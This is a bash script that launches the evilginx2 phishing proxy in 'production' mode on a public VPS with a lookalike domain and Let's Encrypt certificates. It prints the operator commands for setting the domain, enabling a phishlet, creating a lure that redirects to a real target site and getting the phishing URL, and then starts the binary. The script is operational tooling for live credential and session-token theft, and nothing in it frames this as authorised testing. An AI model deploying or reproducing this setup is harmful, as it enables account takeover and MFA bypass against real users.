#!/usr/bin/env bash
# Start evilginx2 in PRODUCTION mode on a public VPS.
#
# Requirements:
#   - Linux VPS with public IPv4
#   - Registered lookalike domain with DNS pointing at the VPS
#   - Ports 80, 443, 53 reachable from the internet
#   - Root or sudo
#
# Required environment:
#   DOMAIN          your lookalike domain (e.g. acme-secure-login.com)
#   EXTERNAL_IPV4   the VPS public IP
set -euo pipefail
source "$(dirname "$0")/_env.sh"

[[ -x "$EVILGINX_BIN" ]] || die "evilginx binary missing. run: make build-evilginx"
[[ "${EUID:-$(id -u)}" -eq 0 ]] || warn "not running as root; binding to 80/443/53 will likely fail."

: "${DOMAIN:?set DOMAIN=your-lookalike-domain.com}"
: "${EXTERNAL_IPV4:?set EXTERNAL_IPV4=<VPS public IPv4>}"

YELLOW=$'\e[1;33m'
RESET=$'\e[0m'

cat <<INFO

${YELLOW}=====================================================${RESET}
${YELLOW}  evilginx2 PRODUCTION  (real domain + Let's Encrypt)${RESET}
${YELLOW}=====================================================${RESET}

  domain        : ${DOMAIN}
  external IP   : ${EXTERNAL_IPV4}
  phishlets dir : ${PHISHLETS_DIR}
  data dir      : ${EVILGINX_DATA_DIR}

At the ':' prompt, run:

  config domain ${DOMAIN}
  config ipv4 external ${EXTERNAL_IPV4}
  phishlets hostname YOUR_PHISHLET ${DOMAIN}
  phishlets enable YOUR_PHISHLET
  lures create YOUR_PHISHLET
  lures edit 0 redirect_url https://www.real-target.com
  lures get-url 0

INFO

read -r -p "Press enter to launch (Ctrl-C to abort)..." _

"$EVILGINX_BIN" \
    -p "$PHISHLETS_DIR" \
    -t "$REDIRECTORS_DIR" \
    -c "$EVILGINX_DATA_DIR" \
    -debug
